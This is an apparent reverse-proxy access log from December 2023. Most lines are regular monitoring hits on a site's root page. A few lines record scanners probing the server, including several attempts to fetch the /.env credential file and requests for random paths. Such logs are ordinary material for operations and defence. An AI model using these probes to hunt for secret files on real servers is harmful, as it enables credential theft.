128.14.236.128 - - [19/Dec/2023:19:22:44 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 10660 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10661 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10662 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10663 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10664 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10665 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10666 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10667 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10668 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10669 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10670 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10671 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10672 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10675 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10676 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10677 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10678 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10679 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10680 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10681 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10682 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10683 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10684 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10685 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10686 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10687 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10688 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10689 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10690 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:19:37:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10691 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:19:37:41 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10692 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10693 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10694 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10695 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10696 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10697 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10698 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10699 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10700 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10701 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10702 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10703 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10704 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10705 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10706 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10707 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10708 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10709 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10710 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10711 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10712 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10713 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10714 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10715 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10716 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10717 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10718 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10719 "www@docker" "http://172.18.0.9:80" 0ms
198.58.122.115 - - [19/Dec/2023:19:51:32 +0000] "GET /clID HTTP/1.1" 301 17 "-" "-" 10720 "web-to-websecure@internal" "-" 0ms
198.58.122.115 - - [19/Dec/2023:19:51:32 +0000] "GET /fDJi HTTP/1.1" 301 17 "-" "-" 10721 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:19:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10722 "www@docker" "http://172.18.0.9:80" 1ms
192.46.213.187 - - [19/Dec/2023:19:51:37 +0000] "GET /QPFu HTTP/1.1" 404 19 "-" "-" 10723 "-" "-" 0ms
192.46.213.187 - - [19/Dec/2023:19:51:38 +0000] "GET /9hkQ HTTP/1.1" 404 19 "-" "-" 10724 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10725 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10726 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10727 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10728 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10729 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10730 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10731 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10732 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10733 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10734 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10735 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10736 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10737 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10738 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10739 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10740 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10741 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10742 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10743 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10744 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10745 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10746 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10747 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10748 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10749 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10750 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10751 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10752 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10753 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10754 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10755 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10756 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:20:07:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10757 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [19/Dec/2023:20:07:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10758 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10759 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10760 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10761 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10762 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10763 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10764 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10765 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10766 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10767 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10768 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10769 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10770 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10771 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10772 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10773 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10774 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10775 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10776 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10777 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10778 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10779 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10780 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10781 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10782 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10783 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10784 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10785 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10786 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [19/Dec/2023:20:22:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10787 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:20:22:09 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10788 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10789 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10790 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10791 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10792 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10793 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.223 - - [19/Dec/2023:20:24:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10794 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10795 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10796 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10797 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.223 - - [19/Dec/2023:20:25:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10798 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10799 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10800 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10801 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10802 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10803 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10804 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10805 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10806 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10807 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10808 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10809 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10810 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10811 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10812 "www@docker" "http://172.18.0.9:80" 1ms
185.142.236.41 - - [19/Dec/2023:20:33:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10813 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10814 "www@docker" "http://172.18.0.9:80" 0ms
185.142.236.41 - - [19/Dec/2023:20:33:34 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 10815 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10816 "www@docker" "http://172.18.0.9:80" 0ms
185.142.236.41 - - [19/Dec/2023:20:33:36 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 10817 "-" "-" 0ms
185.142.236.41 - - [19/Dec/2023:20:33:39 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 10818 "-" "-" 0ms
185.142.236.41 - - [19/Dec/2023:20:33:42 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 10819 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10820 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10821 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10822 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10823 "www@docker" "http://172.18.0.9:80" 51ms
159.203.109.206 - - [19/Dec/2023:20:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10824 "www@docker" "http://172.18.0.9:80" 21ms
167.71.120.76 - - [19/Dec/2023:20:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10825 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:20:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10826 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10827 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10828 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10829 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10830 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10831 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:20:40:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10832 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10833 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:20:40:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10834 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10835 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10836 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10837 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10838 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10839 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10841 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10842 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10843 "www@docker" "http://172.18.0.9:80" 1ms
